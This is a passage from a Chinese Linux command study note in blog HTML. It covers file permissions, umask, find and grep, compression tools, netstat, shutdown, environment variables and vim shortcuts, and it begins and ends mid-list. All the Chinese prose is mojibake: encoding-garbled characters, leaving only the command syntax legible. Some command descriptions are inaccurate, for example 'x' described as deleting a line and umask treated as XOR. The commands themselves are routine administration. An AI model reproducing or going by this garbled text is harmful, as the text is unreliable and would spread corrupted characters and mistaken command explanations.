<p>åˆ é™¤è½¯é“¾æ¥ä½¿ç”¨<code>rm -rf name</code>ä¸èƒ½åŠ /ï¼Œä¸ç„¶ä¼šå˜æˆåˆ é™¤ç›®å½•</p>
<p>ç¡¬é“¾æ¥ä¸èƒ½é’ˆå¯¹ç›®å½•ä½¿ç”¨</p>
</li>
</ul>
</li>
</ul>
<h3 id="æƒé™ç®¡ç†å‘½ä»¤"><a href="#æƒé™ç®¡ç†å‘½ä»¤" class="headerlink" title="æƒé™ç®¡ç†å‘½ä»¤"></a>æƒé™ç®¡ç†å‘½ä»¤</h3><ul>
<li><p>æ›´æ”¹æƒé™ï¼šchmodæ”¹å˜æ–‡ä»¶æˆ–è€…ç›®å½•æƒé™</p>
<ul>
<li><p>chmod{ugoa}{+-=}   ç›®å½•æˆ–æ–‡ä»¶å</p>
<p>user   group  other all</p>
<p>ä¾‹å­ï¼š chmod u+w test ,ç»™testæ–‡ä»¶çš„æ‰€æœ‰è€…åŠ ä¸Šwriteçš„æƒé™</p>
</li>
<li><p>chmod  744 æ–‡ä»¶æˆ–è€…ç›®å½•å </p>
<p>ä¾‹å­ï¼šr4   w2   x1</p>
<p>â€‹          rwxrâ€“râ€“    å¯¹åº” 744</p>
<p>-R é€’å½’ä¿®æ”¹</p>
<p>å…³äºrwxæƒé™çš„ç†è§£</p>
<p>file    r: cat/more/less/head/tail</p>
<p>â€‹    w:vim</p>
<p>â€‹    x:script command</p>
<p>directory   r:ls</p>
<p>â€‹                   w:touch/mkdir/rmdir/rm</p>
<p>â€‹           x:cd</p>
<p>ç”¨æˆ·æ˜¯ç”±æœ‰åˆ é™¤ä¸€ä¸ªæ–‡ä»¶çš„æƒé™ä¸æ˜¯çœ‹è¿™ä¸ªç”¨æˆ·å¯¹æ–‡ä»¶æœ¬èº«çš„æƒé™ï¼Œ</p>
<p>è€Œæ˜¯çœ‹ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼ˆdirectoryï¼‰æ˜¯å¦æœ‰å†™æƒé™</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><ul>
<li>æ”¹å˜æ–‡ä»¶æ‰€æœ‰è€…chown</li>
</ul>
<p>chown [æ‰€æœ‰è€…][æ–‡ä»¶æˆ–ç›®å½•]</p>
</li>
<li><ul>
<li>chgrp[ç”¨æˆ·ç»„][æ–‡ä»¶æˆ–è€…ç›®å½•]</li>
</ul>
</li>
<li><p>umask -S</p>
<p>æ˜¾ç¤ºè®¾ç½®æ–‡ä»¶çš„ç¼ºçœæƒé™(åˆ›å»ºæ–‡ä»¶æ—¶é»˜è®¤çš„æƒé™ï¼‰</p>
<p>ç¼ºçœåˆ›å»ºçš„æ–‡ä»¶æ²¡æœ‰å¯æ‰§è¡Œæƒé™xï¼Œåˆ›å»ºæ—¶ä¼šè‡ªåŠ¨æ˜¯åˆ å»xæƒé™</p>
<p>umask æƒé™ç    =&gt; æ”¹å˜ç¼ºçœæƒé™</p>
</li>
</ul>
<p>uamskæä¾›çš„å››ä½æ•°ä¾‹å¦‚0022ï¼Œç¬¬ä¸€ä½0æ˜¯ç‰¹æ®Šæƒé™ï¼Œ</p>
<p>022éœ€è¦ä¸777ç›¸å‡æ‰æ˜¯æƒé™ï¼Œå³755ï¼ˆå¼‚æˆ–è¿ç®—ï¼‰æ‰æ˜¯ç¼ºçœæƒé™</p>
<h3 id="æ–‡ä»¶æœç´¢ç³»ç»Ÿ"><a href="#æ–‡ä»¶æœç´¢ç³»ç»Ÿ" class="headerlink" title="æ–‡ä»¶æœç´¢ç³»ç»Ÿ"></a>æ–‡ä»¶æœç´¢ç³»ç»Ÿ</h3><ul>
<li><p>find </p>
<p>æ–‡ä»¶æœç´¢</p>
<p>find [æœç´¢èŒƒå›´][åŒ¹é…æ¡ä»¶]</p>
<ul>
<li><p>-name æ ¹æ®æ–‡ä»¶åæœç´¢ï¼ˆç²¾å‡†åŒ¹é…ï¼Œæ¨¡ç³Šæœç´¢å¯ä»¥ç”¨*é€šé…ç¬¦ï¼Œ?åŒ¹é…å•ä¸ªå­—ç¬¦ï¼‰</p>
<p>â€‹    -iname æœç´¢ä¸åŒºåˆ†å¤§å°å†™</p>
</li>
<li><p>-sizeæ ¹æ®å¤§å°æ¥æŸ¥æ‰¾  +å¤§äºå¤šå¤§çš„æ–‡ä»¶ -å°äºå¤šå¤§çš„æ–‡ä»¶ </p>
<p>â€‹    -size +204800   æŸ¥æ‰¾å¤§äº100MBçš„æ–‡ä»¶</p>
<p>ä¸€ä¸ªæ•°æ®å— 512 byte = 0.5KBï¼Œå³1KB=2ä¸ªæ•°æ®å—</p>
<p>100MB=102400KB=204800</p>
</li>
<li><p>-user åœ¨æ ¹ç›®å½•æŸ¥æ‰¾æ‰€æœ‰è€…æ¥æŸ¥æ‰¾</p>
</li>
<li><p>-group åœ¨æ ¹ç›®å½•æ ¹æ®æ‰€å±ç»„æ¥æŸ¥æ‰¾</p>
</li>
<li><p>-amin            -cmin              - mminæ ¹æ®æ—¶é—´å±æ€§æ¥æŸ¥æ‰¾</p>
<p>è®¿é—®æ—¶é—´access     æ–‡ä»¶å±æ€§change    æ–‡ä»¶å†…å®¹modify</p>
<p>+-=ä¸sizeç›¸åŒ</p>
</li>
<li><p>-a                         -r</p>
<p>and                      or</p>
</li>
<li><p>-typeæ ¹æ®æ–‡ä»¶ç±»å‹æŸ¥æ‰¾</p>
<p>fæ–‡ä»¶  dç›®å½•  lè½¯é“¾æ¥æ–‡ä»¶</p>
</li>
<li><p>-exec/-ok å‘½ä»¤ {} ; æ³¨æ„ç©ºæ ¼</p>
<p>è¯¥å‘½ä»¤ç”¨æ¥å¯¹æœç´¢ç»“æœæ‰§è¡Œæ“ä½œ</p>
<p>ä¾‹å­ï¼šfind /etc -name inittab -exec ls -l {} ;       æŸ¥æ‰¾/etc ç›®å½•ä¸‹å«åšinittabåå­—çš„æ–‡ä»¶å¹¶ä¸”åˆ—å‡ºè¯¦ç»†çš„ä¿¡æ¯</p>
<p>find /etc -name inittab -ok rm {}  \ï¼› æŸ¥æ‰¾è¯¥æ–‡ä»¶å¹¶ä¸”è¯¢é—®æ˜¯å¦åˆ é™¤</p>
</li>
<li><p>-inum æ ¹æ®ièŠ‚ç‚¹æ¥æŸ¥æ‰¾æ–‡ä»¶</p>
<p>æ ¹æ®ièŠ‚ç‚¹åˆ é™¤æ–‡ä»¶ find . -inum 31531 -exec rm {} ;  å‡è®¾æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªièŠ‚ç‚¹ä¸º31531ï¼Œâ€.â€æŒ‡å½“å‰ç›®å½•</p>
<p>-inum è¿˜å¯ä»¥ç”¨æ¥æŸ¥æ‰¾æ˜¯å¦æœ‰ç¡¬é“¾æ¥ï¼ˆç¡¬é“¾æ¥ä¸èƒ½è·¨åŒºä¸”ièŠ‚ç‚¹ç›¸åŒï¼‰</p>
</li>
</ul>
</li>
<li><p>locate </p>
<p> ç±»ä¼¼winä¸­everythingçš„åŸç†,</p>
<p>   åœ¨Linuxå½“ä¸­æœ‰ä¸€æ•°æ®åº“å®šæœŸè‡ªåŠ¨æ›´æ–°æ–‡ä»¶ç³»ç»Ÿï¼Œæœç´¢æ—¶åªéœ€æœç´¢æ•°æ®åº“å³å¯ï¼Œ</p>
<p>   æ‰‹åŠ¨æ›´æ–°å‘½ä»¤updatedbï¼Œæ–‡ä»¶èµ„æ–™åº“ä¸ä¼šæ›´æ–°/tmpç›®å½•ä¸­çš„æ–‡ä»¶</p>
<p>-iä¸åŒºåˆ†å¤§å°å†™</p>
</li>
<li><p>æŸ¥æ‰¾å‘½ä»¤çš„ä½ç½®     which</p>
<p>which ls ï¼Œwhich useradd</p>
</li>
<li><p>whereis æœç´¢å‘½ä»¤æ‰€åœ¨ç›®å½•åŠå¸®åŠ©æ–‡æ¡£è·¯å¾„</p>
</li>
<li><p>grep åœ¨æ–‡ä»¶å†…å®¹ä¸­è¿›è¡Œæœç´¢</p>
<p>grep [å†…å®¹åå­—][è·¯å¾„]</p>
<p>-iä¸åŒºåˆ†ä¸å¤§å°å†™</p>
<p>-væ’é™¤æŒ‡å®šå­—ç¬¦ä¸²</p>
<p>grep -v ^# /etc/inittab                â€œ^â€ä¸ºè¡Œé¦–ä¸ºæ³¨é‡Šè¡Œçš„æ„æ€</p>
</li>
</ul>
<h3 id="å¸®åŠ©å‘½ä»¤"><a href="#å¸®åŠ©å‘½ä»¤" class="headerlink" title="å¸®åŠ©å‘½ä»¤"></a>å¸®åŠ©å‘½ä»¤</h3><ul>
<li><p>man </p>
<p>å¯ä»¥çœ‹å‘½ä»¤å’Œé…ç½®æ–‡ä»¶çš„å¸®åŠ©</p>
<p>man+é…ç½®æ–‡ä»¶åç§°ï¼Œä¸éœ€è¦ç»å¯¹è·¯å¾„ </p>
<p>å¸®åŠ©æ–‡æ¡£ä¸­å¯ä»¥ç”¨â€œ/â€+å…³é”®è¯æ¥æŸ¥æ‰¾</p>
<p>1è¡¨ç¤ºå‘½ä»¤çš„å¸®åŠ©    5è¡¨ç¤ºé…ç½®æ–‡ä»¶çš„å¸®åŠ©</p>
<p>å¯ä»¥ç”¨whereisæ¥æŸ¥çœ‹å‘½ä»¤çš„è·¯å¾„ï¼Œè·¯å¾„ä¸­åŒ…å«1ï¼Œ5</p>
<p>æŸ¥æ‰¾passwdé…ç½®æ–‡ä»¶ man 5 passwd;</p>
<p>man passwdé»˜è®¤æŸ¥æ‰¾passwdå‘½ä»¤è€Œä¸æ˜¯é…ç½®æ–‡ä»¶</p>
</li>
<li><p>whatis å‘½ä»¤ åç§°</p>
<p>æŸ¥çœ‹å‘½ä»¤çš„ç®€çŸ­ çš„ä¿¡æ¯</p>
</li>
<li><p>apropos é…ç½®æ–‡ä»¶åç§°</p>
<p>æŸ¥çœ‹é…ç½®æ–‡ä»¶ç®€çŸ­çš„ä¿¡æ¯</p>
</li>
<li><p>å‘½ä»¤ â€“help</p>
<p>å¯ä»¥è·å¾—ç®€çŸ­å‚æ•°ä¿¡æ¯ç­‰</p>
</li>
<li><p>help ã€shellå†…ç½®å‘½ä»¤ã€‘</p>
<p>ä¾‹å¦‚cdï¼Œpwdï¼Œumaskéƒ½æ˜¯shellå†…ç½®å‘½ä»¤ï¼Œæ— æ³•ç”¨manï¼Œåªèƒ½ç”¨helpæ¥è·å–å¸®åŠ©</p>
</li>
<li><h3 id="è§£å‹ç¼©å‘½ä»¤"><a href="#è§£å‹ç¼©å‘½ä»¤" class="headerlink" title="è§£å‹ç¼©å‘½ä»¤"></a>è§£å‹ç¼©å‘½ä»¤</h3></li>
<li><p>å‹ç¼©æ–‡ä»¶gzip</p>
</li>
<li><p>è§£å‹ç¼©å‘½ä»¤gunzip</p>
</li>
</ul>
<p>å‹ç¼©è§£å‹.gz</p>
<p>è¯¥å‘½ä»¤åªèƒ½å‹ç¼©æ–‡ä»¶ä¸èƒ½å‹ç›®å½•ï¼Œä¸ä¿ç•™æºæ–‡ä»¶</p>
<ul>
<li><p>tar [å‹ç¼©åçš„æ–‡ä»¶å][ç›®å½•]      æ–‡ä»¶æ‰“åŒ…æˆæ–‡ä»¶å¤¹ï¼ˆç›®å½•ï¼‰ä¹‹åè§£ã€å‹ç¼©ï¼Œå¯¹ç›®å½•è¿›è¡Œæ“ä½œ</p>
<p>-cæ‰“åŒ…</p>
<p>-væ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</p>
<p>-fæŒ‡å®šæ–‡ä»¶å</p>
<p>-zæ‰“åŒ…åŒæ—¶å‹ç¼©</p>
</li>
</ul>
<p>è§£åŒ…-xè§£åŒ…     </p>
<p>â€‹                                                       ä¿ç•™åŸæ–‡ä»¶</p>
<p>è§£å‹å¹¶è§£åŒ…åˆ°æŒ‡å®šè¯¥ç›®å½•ä¾‹å­ï¼štar -zxf  xxx.tar.gz   -C   [æŒ‡å®šè·¯å¾„]</p>
<ul>
<li><p>zip [å‹ç¼©åçš„æ–‡ä»¶å][æ–‡ä»¶æˆ–ç›®å½•]  å¯ä»¥ä¿ç•™åŸæ–‡ä»¶</p>
<p>-r å¯ä»¥å‹ç¼©ç›®å½•</p>
<p>è§£å‹ç¼©unzip</p>
</li>
<li><p>bzip2 [æ–‡ä»¶]</p>
</li>
</ul>
<p>-käº§ç”Ÿå‹ç¼©æ–‡ä»¶åä¿ç•™æºæ–‡ä»¶</p>
<p>å‹ç¼©æ¯”è¾ƒå¤§ </p>
<p>tar -cjf [å‹ç¼©åçš„æ–‡ä»¶å][ç›®å½•] </p>
<ul>
<li><p>bunzip2 </p>
<p>ä¾‹å­ï¼štar -xjf xxx.tar.bz2   è§£å‹ç¼©bz2æ ¼å¼å¹¶ä¸”è§£åŒ…tar -x</p>
<h3 id="ç½‘ç»œå‘½ä»¤"><a href="#ç½‘ç»œå‘½ä»¤" class="headerlink" title="ç½‘ç»œå‘½ä»¤"></a>ç½‘ç»œå‘½ä»¤</h3></li>
<li><p>ç”¨æˆ·ä¹‹é—´å‘é€ä¿¡æ¯ write [ç”¨æˆ·å]</p>
<p>CTRL+dä¿å­˜</p>
<p>wall è‹±æ–‡åŸç†write all</p>
<p>ä¾‹å­wall helloï¼Œç»™æ‰€æœ‰åœ¨çº¿ç”¨æˆ·å‘hello</p>
</li>
<li><p>ping   æŒ‡å®šå‘é€æ¬¡æ•°</p>
<p>-c [æ¬¡æ•°]  æŒ‡å®šå‘é€æ¬¡æ•°</p>
</li>
<li><p>ifconfig</p>
<p>intreface configure</p>
</li>
<li><p>mail [ç”¨æˆ·å]</p>
</li>
</ul>
<p>mail è¿›å…¥ç•Œé¢ï¼Œqé€€å‡ºï¼Œdåˆ é™¤ï¼Œhåˆ—å‡ºé‚®ä»¶åˆ—è¡¨</p>
<ul>
<li><p>last</p>
<p>æ‰€æœ‰ç”¨æˆ·ç™»å½•çš„æ—¶é—´</p>
<p>lastlog -u[ç”¨æˆ·åuid] åªæŸ¥çœ‹è¯¥ç”¨æˆ·ä¸Šæ¬¡ç™»é™†çš„ä¿¡æ¯</p>
</li>
<li><p>traceroute</p>
</li>
<li><p>netstat  æŸ¥è¯¢ç½‘ç»œçŠ¶æ€</p>
</li>
</ul>
<p>-t tcp</p>
<p>-u udp</p>
<p>-l ç›‘å¬ listen</p>
<p>-r è·¯ç”± route</p>
<p>-n æ˜¾ç¤ºipåœ°å€å’Œç«¯å£å· nslookup</p>
<p>netstat -tlun    æŸ¥çœ‹æœ¬åœ°ç›‘å¬ç«¯å£</p>
<p>netstat -an   æŸ¥çœ‹æ‰€æœ‰ç½‘ç»œé“¾æ¥ï¼ˆç›‘å¬ï¼Œå·²é“¾æ¥ï¼‰</p>
<p>netstat   -rn   æŸ¥çœ‹æœ¬æœºè·¯ç”±è¡¨</p>
<ul>
<li>setup åªæœ‰redhatç³»åˆ—ä¸­æœ‰</li>
</ul>
<p>ç”¨äºé…ç½®ç½‘ç»œ</p>
<ul>
<li>mount æŒ‚è½½å‘½ä»¤</li>
</ul>
<p>mount [-t æ–‡ä»¶ç³»ç»Ÿ]è®¾å¤‡æ–‡ä»¶å  æŒ‚è½½ç‚¹</p>
<p>å¸è½½å‘½ä»¤umount</p>
<h3 id="å…³æœºé‡å¯"><a href="#å…³æœºé‡å¯" class="headerlink" title="å…³æœºé‡å¯"></a>å…³æœºé‡å¯</h3><ul>
<li><p>shutdown</p>
<p>-hæ—¶é—´</p>
<p>-ré‡å¯</p>
<p>-cå–æ¶ˆå‰ä¸€ä¸ªå…³æœºå‘½ä»¤ </p>
</li>
<li><p>/etc/inittab </p>
</li>
</ul>
<p>ä¿®æ”¹ç³»ç»Ÿé»˜è®¤è¿è¡Œçº§åˆ«</p>
<p>ininttab 5åˆ‡æ¢æˆ5çš„å›¾å½¢ç•Œé¢</p>
<p>runlevel æŸ¥è¯¢ç³»ç»Ÿè¿è¡Œçº§åˆ«</p>
<ul>
<li>logouté€€å‡ºç™»å½•ç•Œé¢</li>
</ul>
<h3 id="ç¯å¢ƒå˜é‡"><a href="#ç¯å¢ƒå˜é‡" class="headerlink" title="ç¯å¢ƒå˜é‡"></a>ç¯å¢ƒå˜é‡</h3><table>
<thead>
<tr>
<th>å˜é‡åç§°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>HOME</td>
<td>ç”¨æˆ·çš„ä¸»ç›®å½•ï¼ˆå³å®¶ç›®å½•ï¼‰</td>
</tr>
<tr>
<td>SHELL</td>
<td>ç”¨æˆ·åœ¨ä½¿ç”¨çš„Shellè§£é‡Šå™¨åç§°</td>
</tr>
<tr>
<td>HISTSIZE</td>
<td>è¾“å‡ºçš„å†å²å‘½ä»¤è®°å½•æ¡æ•°</td>
</tr>
<tr>
<td>HISTFILESIZE</td>
<td>ä¿å­˜çš„å†å²å‘½ä»¤è®°å½•æ¡æ•°</td>
</tr>
<tr>
<td>MAIL</td>
<td>é‚®ä»¶ä¿å­˜è·¯å¾„</td>
</tr>
<tr>
<td>LANG</td>
<td>ç³»ç»Ÿè¯­è¨€ã€è¯­ç³»åç§°</td>
</tr>
<tr>
<td>RANDOM</td>
<td>ç”Ÿæˆä¸€ä¸ªéšæœºæ•°å­—</td>
</tr>
<tr>
<td>PS1</td>
<td>Bashè§£é‡Šå™¨çš„æç¤ºç¬¦</td>
</tr>
<tr>
<td>PATH</td>
<td>å®šä¹‰è§£é‡Šå™¨æœç´¢ç”¨æˆ·æ‰§è¡Œå‘½ä»¤çš„è·¯å¾„</td>
</tr>
<tr>
<td>EDITOR</td>
<td>ç”¨æˆ·é»˜è®¤çš„æ–‡æœ¬ç¼–è¾‘å™¨</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH #è¾“å‡ºç¯å¢ƒå˜é‡æ‰€æœ‰è·¯å¾„</span><br><span class="line">PATH = $ PATH : /root/bin # æ·»åŠ æ–‡ä»¶å¤¹åˆ°ç¯å¢ƒå˜é‡æœç´¢çš„ç¯å¢ƒ</span><br></pre></td></tr></table></figure>



<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><ul>
<li><p>vi æ–‡ä»¶å</p>
<p>é»˜è®¤è¿›å…¥ç¼–è¾‘æ¨¡å¼</p>
</li>
</ul>
<p>æ’å…¥æ¨¡å¼ï¼šç”¨æ¥æ‰“å¼€æ–‡ä»¶ï¼Œè¿›å…¥æ–‡ä»¶ä¹‹åç”¨aioå³å¯è¿›å…¥æ’å…¥æ¨¡å¼ï¼Œç”¨escé”®è®©é€€å‡ºæ’å…¥æ¨¡å¼</p>
<p>è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼šåœ¨å‘½ä»¤æ¨¡å¼ä¸‹<code>ï¼š</code></p>
<p>â€‹    æ˜¾ç¤ºè¡Œå·<code>:set nu</code></p>
<p>â€‹    ä¿å­˜é€€å‡º<code>:wq</code></p>
<p>å‘½ä»¤æ¨¡å¼ä¸‹ï¼š</p>
<p>jsonæ ¼å¼åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:%!python3 -m json.tool</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>åœ¨å…‰æ ‡æ‰€åœ¨å­—ç¬¦åæ’å…¥ï¼ˆafterï¼‰</td>
</tr>
<tr>
<td>A</td>
<td>åœ¨å…‰æ ‡æ‰€åœ¨è¡Œå°¾æ’å…¥</td>
</tr>
<tr>
<td>i</td>
<td>åœ¨å…‰æ ‡æ‰€åœ¨å­—ç¬¦å‰æ’å…¥</td>
</tr>
<tr>
<td>I</td>
<td>åœ¨å…‰æ ‡æ‰€åœ¨è¡Œè¡Œé¦–æ’å…¥</td>
</tr>
<tr>
<td>o</td>
<td>åœ¨å…‰æ ‡ä¸‹æ’å…¥æ–°è¡Œ</td>
</tr>
<tr>
<td>O</td>
<td>åœ¨å…‰æ ‡ä¸Šæ’å…¥æ–°è¡Œ</td>
</tr>
</tbody></table>
<p>å‘½ä»¤æ¨¡å¼ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>ï¼šset nu</td>
<td>è®¾ç½®è¡Œå·</td>
</tr>
<tr>
<td>ï¼šset nonu</td>
<td>å–æ¶ˆè¡Œå·</td>
</tr>
<tr>
<td>gg/G</td>
<td>å®šä½åˆ°ç¬¬ä¸€è¡Œ/æœ€åä¸€è¡Œ</td>
</tr>
<tr>
<td>nG/ï¼šn</td>
<td>å®šä½åˆ°nè¡Œ</td>
</tr>
<tr>
<td>$</td>
<td>ç§»è‡³è¡Œå°¾</td>
</tr>
<tr>
<td>0</td>
<td>ç§»è‡³è¡Œé¦–</td>
</tr>
</tbody></table>
<p>å‘½ä»¤æ¨¡å¼ä¸‹ï¼š</p>
<p>åˆ é™¤</p>
<table>
<thead>
<tr>
<th>x</th>
<th>åˆ é™¤å…‰æ ‡æ‰€åœ¨çš„ä¸€è¡Œ</th>
</tr>
</thead>
<tbody><tr>
<td>nx</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨å‡ºånä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>dd</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œï¼Œnddåˆ é™¤nè¡Œdelete</td>
</tr>
<tr>
<td>dG</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œåˆ°æ–‡ä»¶æœ«å°¾å†…å®¹</td>
</tr>
<tr>
<td>D</td>
<td>åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„åˆ°è¡Œå°¾å†…å®¹</td>
</tr>
<tr>
<td>:n1,n2d</td>
<td>åˆ é™¤æŒ‡å®šèŒƒå›´è¡Œ</td>
</tr>
</tbody></table>
<p>å¤åˆ¶å’Œç²˜è´´</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>yy</td>
<td>å¤åˆ¶å½“å‰è¡Œcopy</td>
</tr>
<tr>
<td>nyy</td>
<td>å¤åˆ¶å½“å‰è¡Œä»¥ä¸‹nè¡Œ</td>
</tr>
<tr>
<td>dd</td>
<td>å‰ªåˆ‡å½“å‰è¡Œ</td>
</tr>
<tr>
<td>ndd</td>
<td>å‰ªåˆ‡å½“å‰è¡Œä»¥ä¸‹nè¡Œ</td>
</tr>
<tr>
<td>pï¼ŒP</td>
<td>ç²˜è´´å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œä¸‹æˆ–è¡Œä¸Špaste</td>
</tr>
</tbody></table>
<p>ç²˜è´´æ—¶ä¿ç•™æºæ ¼å¼:</p>
<p>\1. å…ˆè®© Vim å¤„äº NORMAL æ¨¡å¼ä¸‹ï¼›</p>
<p>\2. æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå…ˆè¿›å…¥ç²˜è´´æ¨¡å¼ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set paste</span><br></pre></td></tr></table></figure>

<p>\3. ç„¶åè¿›å…¥ INSERT æ¨¡å¼ï¼›</p>
<p>\4. æŒ‰ä¸‹p ç²˜è´´ä»£ç è¿›æ¥ï¼Œè¿™ä¸ªæ—¶å€™çš„æ ¼å¼èƒ½ä¿ç•™åŸæ ·ï¼›</p>
<p>\5. æŒ‰ ESC å›åˆ° NORMAL æ¨¡å¼ï¼›</p>
<p>\6. é€€å‡ºç²˜è´´æ¨¡å¼ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set nopaste</span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢å’Œå–æ¶ˆ</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>å–ä»£å…‰æ ‡æ‰€åœ¨å¤„çš„å­—ç¬¦replace</td>
</tr>
<tr>
<td>R</td>
<td>ä»å…‰æ ‡æ‰€åœ¨å‡ºå¼€å§‹æ›¿æ¢å­—ç¬¦ï¼Œç›´åˆ°escç»“æŸ</td>
</tr>
<tr>
<td>u</td>
<td>undoå–æ¶ˆä¸Šä¸€æ­¥æ“ä½œ</td>
</tr>
</tbody></table>
<p>æœç´¢å’Œæœç´¢æ›¿æ¢å‘½ä»¤</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>/string</td>
<td>æœç´¢æŒ‡å®šå­—ç¬¦ä¸²ï¼Œå¿½ç•¥å¤§å°å†™ï¼šset ic</td>
</tr>
<tr>
<td>n</td>
<td>æœç´¢ä¸‹ä¸€ä¸ªæŒ‡å®šå­—ç¬¦ä¸²å‡ºç°çš„ä½ç½®</td>
</tr>
<tr>
<td>ï¼š%s/old/new/g</td>
<td>å…¨æ–‡æ›¿æ¢æŒ‡å®šå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>ï¼šn1,n1s/old/new/g</td>
<td>åœ¨ä¸€å®šèŒƒå›´å†…æŒ‡å®šæ›¿æ¢å­—ç¬¦ä¸²</td>
</tr>
</tbody></table>
<p>ä¿å­˜å’Œé€€å‡ºå‘½ä»¤</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>ï¼šw</td>
<td>ä¿å­˜ä¿®æ”¹</td>
</tr>
<tr>
<td>ï¼šw new_fliename</td>
<td>å¦å­˜ä¸ºæŒ‡å®šæ–‡ä»¶</td>
</tr>
<tr>
<td>ï¼šwq</td>
<td>ä¿å­˜å¹¶ä¸”é€€å‡º</td>
</tr>
<tr>
<td>ZZ</td>
<td>ä¿å­˜å¹¶ä¸”é€€å‡º</td>
</tr>
<tr>
<td>ï¼šq!</td>
<td>ä¸ä¿å­˜ä¿®æ”¹é€€å‡º</td>
</tr>
<tr>
<td>ï¼šwqï¼</td>
<td>ä¿å­˜ä¿®æ”¹é€€å‡ºï¼Œä»…rootå’Œæ–‡ä»¶æ‰€æœ‰è€…èƒ½ç”¨</td>
</tr>
</tbody></table>
<p>vimæŠ€å·§</p>
<ul>
<li><p>å¯¼å…¥å‘½ä»¤æ‰§è¡Œç»“æœ<code>ï¼šrï¼å‘½ä»¤</code></p>
</li>
<li><p>å®šä¹‰å¿«æ·é”®<code>map å¿«æ·é”®   è§¦å‘å‘½ä»¤</code></p>
</li>
</ul>
<p>ex       <code>:map ^p I#&lt;ESC&gt;</code>      ctrl+påœ¨å…‰æ ‡æ‰€åœ¨è¡Œè¡Œé¦–æ’å…¥ä¸€ä¸ª#</p>
<p>â€‹    <code>:map ^B 0x</code>   åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œè¡Œé¦–çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</p>
<p><strong>å€¼å¾—æ³¨æ„çš„æ˜¯,åœ¨ä½¿ç”¨å¿«æ·é”®å®šä¹‰æ—¶ï¼Œ^pä¸èƒ½ç›´æ¥æŒ‰è¦åŒæ—¶æŒ‰ä½ctrl+V+p</strong></p>
<ul>
<li><p>è¿ç»­è¡Œæ³¨é‡Š</p>
<p><code>n1,n2s/^/#/g</code>åœ¨n1å’Œn2è¡Œä¹‹é—´è¡Œé¦–æ·»åŠ â€œ#â€   </p>
<p><code>n1,n2s/^#//g</code>åˆ é™¤n1n2è¡Œé¦–çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</p>
<p><code>n1,n2s/^/\/\//g</code>åœ¨è¡Œé¦–å¢åŠ //ï¼Œæ³¨é‡Šç¬¦ï¼Œ\ä»£è¡¨è½¬ä¹‰</p>
</li>
<li><p>æ›¿æ¢ <code>ab mymail 834876096@163.com</code></p>
</li>
</ul>
<p>vimrcæ–‡ä»¶å¯ä»¥åœ¨å’Œç”¨æˆ·åç›®å½•ä¸‹åˆ›å»º<code>.vimrc</code>,è¿™æ ·é‡å¯å°±ä¸ä¼šè¢«æŠ¹é™¤é…ç½®</p>
<ul>
<li><p>åŒæ—¶æ˜¾ç¤ºå¤šä¸ªæ–‡ä»¶(åˆ†å±)</p>
<p><code>:split</code></p>
<p><code>:vsplit</code></p>
</li>
<li><p>åœ¨æ–‡ä»¶ä¸­åˆ‡æ¢</p>
<p>ctrl+6ä¸‹ä¸€ä¸ªæ–‡ä»¶</p>
<p><code>:bp</code>ä¸Šä¸€ä¸ªæ–‡ä»¶</p>
<p><code>:bp</code>ä¸Šä¸€ä¸ªæ–‡ä»¶</p>
</li>
<li><p>çª—å£ä¹‹é—´åˆ‡æ¢</p>
<p>ctrl+w h/j/k/l</p>
</li>
<li><p>3.å¤šæ–‡æ¡£ç¼–è¾‘çš„å‘½ä»¤å¦‚ä¸‹</p>
